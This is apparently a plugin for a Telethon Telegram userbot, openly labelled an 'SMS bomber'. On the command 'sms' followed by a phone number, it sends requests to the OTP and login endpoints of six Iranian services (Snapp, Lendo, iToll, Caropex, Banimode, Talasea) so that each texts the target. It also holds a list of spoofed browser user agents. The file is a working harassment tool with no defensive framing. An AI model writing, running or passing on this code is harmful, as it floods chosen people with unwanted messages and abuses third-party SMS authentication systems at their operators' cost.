from telethon.events import NewMessage
from requests import post

userAgents = [
  # Mobile Devices
  'Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Mobile Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Mobile Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Linux; Android 11; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Mobile Safari/537.36',
  'Mozilla/5.0 (Linux; Android 11; M2011K2C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Mobile Safari/537.36',

  # Tablets
  'Mozilla/5.0 (iPad; CPU OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-T720) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36',
  'Mozilla/5.0 (Linux; Android 10; LM-V605) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36',
  'Mozilla/5.0 (iPad; CPU OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-T727V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36',
  'Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-T510) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36',

  # Desktops
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 Edg/103.0.1264.49',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15',
  'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0'
]


def sms_bomber(phoneNumber):
  urls = {
    'snapp': {'url': 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp',
              'payload': {'cellphone': '+98' + phoneNumber}},
    'lendo': {'url': 'https://api.lendo.ir/api/customer/auth/send-otp', 'payload': {'mobile': '0' + phoneNumber}},
    'itoll': {'url': 'https://app.itoll.ir/api/v1/auth/login', 'payload': {'mobile': '0' + phoneNumber}},
    'caropex': {'url': 'https://caropex.com/api/v1/user/login', 'payload': {'mobile': '0' + phoneNumber}},
    'banimode': {'url': 'https://mobapi.banimode.com/api/v2/auth/request', 'payload': {"phone": "0" + phoneNumber}},
    'talasea': {'url': 'https://api.talasea.ir/api/auth/sentOTP', 'payload': {"phoneNumber": "0" + phoneNumber}}
  }
  result = 0
  for i in urls:
    response = post(urls[i]['url'], data=urls[i]['payload'])
    if response.status_code == 200:
      result = result + 1
  return {'all': len(urls), 'success': result, 'error': len(urls) - result}


async def init(bot):
  @bot.on(NewMessage(pattern=r'sms 9\d{9}', outgoing=True))
  async def bomber(event):
    phoneNumber = event.text.split(' ')[1]
    await event.edit('Sending SMS Bombs to ' + phoneNumber)
    try:
      result = sms_bomber(phoneNumber)
      await event.edit(
        "**ALL:** `{}`\n**Success:** `{}`\n**Errors:** `{}`".format(result['all'], result['success'], result['error']))
    except Exception as e:
      print(e)
      await event.edit("**Error {}!**\n{}".format(type(e).__name__, e.args))
